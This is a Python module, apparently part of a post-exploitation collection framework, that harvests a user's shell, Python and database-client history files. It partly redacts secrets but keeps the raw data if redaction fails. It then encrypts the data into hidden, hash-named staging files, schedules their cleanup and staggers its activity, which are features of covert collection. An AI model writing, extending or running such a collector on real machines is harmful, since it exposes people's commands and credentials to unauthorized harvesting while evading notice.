
from __future__ import annotations

import logging
import os
import re
from pathlib import Path
from typing import Generator, Optional

from forge.utils.post.collectors.filesystem import ArtifactMetadata, BaseCollector, CollectedFile

_LOG = logging.getLogger(__name__)

REDACTION_PATTERNS = (
    (re.compile(r"(?i)\b(password|passwd|secret|token|key)\b\s*[:=]\s*([^\s]+)"), r"\1=[REDACTED]"),
    (re.compile(r"\bAKIA[0-9A-Z]{16}\b"), "[REDACTED]"),
)

class ShellHistoryCollector(BaseCollector):
    """
    Collect shell history files with filtering for secrets.
    
    Targets:
      - ~/.bash_history
      - ~/.zsh_history
      - ~/.python_history
      - ~/.mysql_history
      - ~/.psql_history
    """

    def discover(self) -> Generator[ArtifactMetadata, None, None]:
        hist_files = [
            ".bash_history", ".zsh_history", ".python_history",
            ".mysql_history", ".psql_history", ".sh_history"
        ]
        
        for f in hist_files:
            p = Path.home() / f
            if p.exists():
                yield ArtifactMetadata(
                    artifact_family="shell_history",
                    artifact_subtype=f.strip("."),
                    source_path=str(p),
                    source_platform=os.name,
                    collection_method="file_read",
                )

    def collect(self, artifact: ArtifactMetadata) -> Optional[CollectedFile]:
        try:
            path = Path(artifact.source_path)
            if not path.exists():
                return None
            
            data = path.read_bytes()

            # Redact secrets from the history data
            try:
                history_text = data.decode('utf-8', errors='ignore')
                for pattern, replacement in REDACTION_PATTERNS:
                    history_text = pattern.sub(replacement, history_text)
                data = history_text.encode('utf-8')
            except Exception:
                # If redaction fails, we still collect the original data
                pass

            sha256  = self._sha256(data)
            payload = self._compress_and_encrypt(data)
            del data

            ext = artifact.artifact_subtype or "hist"
            stage_path = self._staging_dir / f".{sha256[:16]}.{ext}.tmp"
            stage_path.write_bytes(payload)
            self._register_cleanup(stage_path)

            record = CollectedFile(
                path       = str(path),
                sha256     = sha256,
                size_bytes = len(payload),
                metadata   = artifact,
            )
            self.persist_metadata(record)
            self._stagger_and_pause()
            return record

        except PermissionError:
            _LOG.debug("Permission denied: %s", artifact.source_path)
        except Exception as exc:
            _LOG.debug("Shell history collection error (%s): %s", artifact.source_path, exc)
        return None
